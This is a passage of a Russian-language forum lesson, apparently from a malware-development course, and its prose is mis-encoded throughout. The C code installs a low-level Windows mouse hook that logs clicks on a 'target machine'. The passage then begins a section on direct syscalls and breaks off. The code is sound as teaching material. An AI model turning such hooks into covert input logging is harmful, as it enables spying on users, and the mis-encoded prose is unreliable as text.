–§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∞—Ç—å –≤ —Å–µ–±—è CallNextHookEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // –ö–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}</code></pre>
	</div>
</div><br />
–ù–∞ –æ—Å–Ω–æ–≤–∞–Ω–∏–∏ –∑–∞–º–µ—á–∞–Ω–∏–π Microsoft –≤—ã–∑–æ–≤ CallNextHookEx —è–≤–ª—è–µ—Ç—Å—è –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–º, –Ω–æ –Ω–∞—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è. –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ –¥—Ä—É–≥–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã, –Ω–µ –±—É–¥—É—Ç –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞—Ö –∏ –º–æ–≥—É—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ.<br />
<br />
–ò –Ω–∞–∫–æ–Ω–µ—Ü, –ø–æ—Å–ª–µ–¥–Ω—è—è —á–∞—Å—Ç—å - –∫–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ö–æ–¥ –±—É–¥–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ, –ø–æ—ç—Ç–æ–º—É –≤ —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –∫–∞–∫–∞—è –∫–Ω–æ–ø–∫–∞ –º—ã—à–∏ –±—ã–ª–∞ –Ω–∞–∂–∞—Ç–∞ —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–≥–æ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] –õ–µ–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] –°—Ä–µ–¥–Ω–∏–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}</code></pre>
	</div>
</div><br />
<b>–û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π</b><br />
<br />
–ü–æ–ª—É—á–∏–≤ –∫–æ–¥, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∫–ª–∏–∫–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –º—ã—à—å—é, —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥ - —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è. –≠—Ç–æ –¥–æ—Å—Ç–∏–≥–∞–µ—Ç—Å—è –ø—É—Ç–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –≤ —Ç–µ—á–µ–Ω–∏–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–∏–æ–¥–∞. –î–ª—è —ç—Ç–æ–≥–æ SetWindowsHookExW –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –æ—Å—Ç–∞–µ—Ç—Å—è –∞–∫—Ç–∏–≤–Ω—ã–º –Ω–∞ –∂–µ–ª–∞–µ–º—ã–π –ø—Ä–æ–º–µ–∂—É—Ç–æ–∫ –≤—Ä–µ–º–µ–Ω–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI WaitForSingleObject.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∫–ª–∏–∫–∞–µ—Ç –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] –õ–µ–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] –°—Ä–µ–¥–Ω–∏–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    // –ø–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–µ—Ä–µ—Ö–≤–∞—Ç—É –≤ —Ü–µ–ø–æ—á–∫–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–≤
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –ü–æ–¥–¥–µ—Ä–∂–∞–Ω–∏–µ —Ä–∞–±–æ—Ç—ã –ø–æ—Ç–æ–∫–∞
    while(1){

    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–£–ª—É—á—à–µ–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</b><br />
<br />
–ü—Ä–æ–±–ª–µ–º–∞ —Å –ø—Ä–µ–¥—ã–¥—É—â–∏–º –∫–æ–¥–æ–º –∑–∞–∫–ª—é—á–∞–ª–∞—Å—å –≤ —Ç–æ–º, —á—Ç–æ —Ü–∏–∫–ª while –Ω–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–π –º—ã—à–∏, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏–ª–æ –∫ –∑–∞–¥–µ—Ä–∂–∫–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –≤—Å–µ —Å–æ–±—ã—Ç–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π —Å –ø–æ–º–æ—â—å—é DefWindowProc. –≠—Ç–æ –æ–±–µ—Å–ø–µ—á–∏—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É —Å–æ–±—ã—Ç–∏—è —Å–∏—Å—Ç–µ–º–æ–π –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é. DefWindowProcW –≤—ã–∑—ã–≤–∞–µ—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –ø—Ä–æ—Ü–µ–¥—É—Ä—É –æ–∫–Ω–∞ –¥–ª—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ª—é–±—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –æ–∫–Ω–∞, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç.<br />
<br />
–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Ç–∞–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏—è, —Å–Ω–∞—á–∞–ª–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω GetMessageW, –∫–æ—Ç–æ—Ä—ã–π –∏–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –∏–∑ –æ—á–µ—Ä–µ–¥–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ –ø–æ—Ç–æ–∫–∞. –ó–∞—Ç–µ–º —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è DefWindowProcW, –∫–æ—Ç–æ—Ä—ã–π –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –µ–≥–æ. GetMessageW –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–æ–æ–±—â–µ–Ω–∏–∏ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ MSG, –∫–æ—Ç–æ—Ä–∞—è –≤–∫–ª—é—á–∞–µ—Ç –≤—Å–µ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–≥–æ –≤—ã–∑–æ–≤–∞ DefWindowProcW.<br />
<br />
–í—Å–µ —ç—Ç–æ –¥–æ–ª–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –≤ —Ü–∏–∫–ª–µ, —á—Ç–æ–±—ã –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —Ä—É—á–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É –∫–∞–∂–¥–æ–≥–æ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∫–ª–∏–∫–Ω–µ—Ç –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] –õ–µ–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] –°—Ä–µ–¥–Ω–∏–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–µ—Ä–µ—Ö–≤–∞—Ç—É –≤ —Ü–µ–ø–æ—á–∫–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–≤
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    MSG         Msg         = { 0 };

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–≤</b><br />
<br />
–ß—Ç–æ–±—ã —É–¥–∞–ª–∏—Ç—å –ª—é–±–æ–π –ø–µ—Ä–µ—Ö–≤–∞—Ç, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π —Ñ—É–Ω–∫—Ü–∏–µ–π SetWindowsHookEx, –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω WinAPI UnhookWindowsHookEx.<br />
UnhookWindowsHookEx –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–æ–ª—å–∫–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.<br />
<br />
<b>–ö–æ–¥ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ SetWindowsHookEx </b><br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ —Å–æ–µ–¥–∏–Ω—è–µ—Ç –≤—Å–µ, —á—Ç–æ –æ–±—Å—É–∂–¥–∞–ª–æ—Å—å –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—Ç —Å–æ–±—ã—Ç–∏–π –∫–ª–∏–∫–∞ –º—ã—à–∏, –∞ –∑–∞—Ç–µ–º —É–¥–∞–ª—è–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞
HHOOK g_hMouseHook      = NULL;

// –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∫–ª–∏–∫–Ω–µ—Ç –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf(&quot;[ # ] –õ–µ–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_RBUTTONDOWN) {
        printf(&quot;[ # ] –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    if (wParam == WM_MBUTTONDOWN) {
        printf(&quot;[ # ] –°—Ä–µ–¥–Ω–∏–π –∫–ª–∏–∫ –º—ã—à–∏ \n&quot;);
    }

    // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–µ—Ä–µ—Ö–≤–∞—Ç—É –≤ —Ü–µ–ø–æ—á–∫–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–≤
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){

    MSG         Msg         = { 0 };

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


int main() {

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥

    // –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞
    if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
        printf(&quot;[!] UnhookWindowsHookEx –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : %d \n&quot;, GetLastError());
    }
    return 0;
}</code></pre>
	</div>
</div></div>
						

							<h2>–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746785345003.png"
		data-src="https://osint42.org/attachments/1746785345003-png.197/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785345003-png.197/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785345003.png"
			title="1746785345003.png"
			width="300" height="300" loading="lazy" />
	</div><br />
<br />
<b>–ß—Ç–æ —Ç–∞–∫–æ–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã (Syscalls)</b><br />
<br />
–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Windows –∏–ª–∏ syscalls —Å–ª—É–∂–∞—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–æ–≥—Ä–∞–º–º —Å —Å–∏—Å—Ç–µ–º–æ–π, –ø–æ–∑–≤–æ–ª—è—è –∏–º –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ —á—Ç–µ–Ω–∏–µ –∏–ª–∏ –∑–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª, —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏.<br />
<br />
–ü–æ–º–Ω–∏—Ç–µ –∏–∑ –≤–≤–æ–¥–Ω—ã—Ö –º–æ–¥—É–ª–µ–π, —á—Ç–æ syscalls - —ç—Ç–æ API, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç –¥–µ–π—Å—Ç–≤–∏—è, –∫–æ–≥–¥–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è WinAPI. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtAllocateVirtualMemory –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è –ø—Ä–∏ –≤—ã–∑–æ–≤–µ —Ñ—É–Ω–∫—Ü–∏–π WinAPI VirtualAlloc –∏–ª–∏ VirtualAllocEx. –ó–∞—Ç–µ–º —ç—Ç–æ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –≤—ã–∑–æ–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏, –≤ —è–¥—Ä–æ Windows, –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∑–∞–ø—Ä–æ—à–µ–Ω–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≥—Ä–∞–º–º–µ.<br />
<br />
–í—Å–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç –∑–Ω–∞—á–µ–Ω–∏–µ NTSTATUS, –∫–æ—Ç–æ—Ä–æ–µ —É–∫–∞–∑—ã–≤–∞–µ—Ç –∫–æ–¥ –æ—à–∏–±–∫–∏. STATUS_SUCCESS (–Ω–æ–ª—å) –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è, –µ—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é.<br />
<br />
–ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –Ω–µ –¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω—ã Microsoft, –ø–æ—ç—Ç–æ–º—É –º–æ–¥—É–ª–∏ syscall –±—É–¥—É—Ç —Å—Å—ã–ª–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—É—é –Ω–∏–∂–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é.<br />
<br />
<div><a href="http://undocumented.ntinternals.net/" target="_blank" class="link link--external" rel="noopener">http://undocumented.ntinternals.net/</a></div><br />
<div><a href="https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html" target="_blank" class="link link--external" rel="noopener">https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html</a></div><br />
<b>–ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ DLL ntdll.dll.<br />
<br />
–ü–æ—á–µ–º—É –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Syscalls</b><br />
<br />
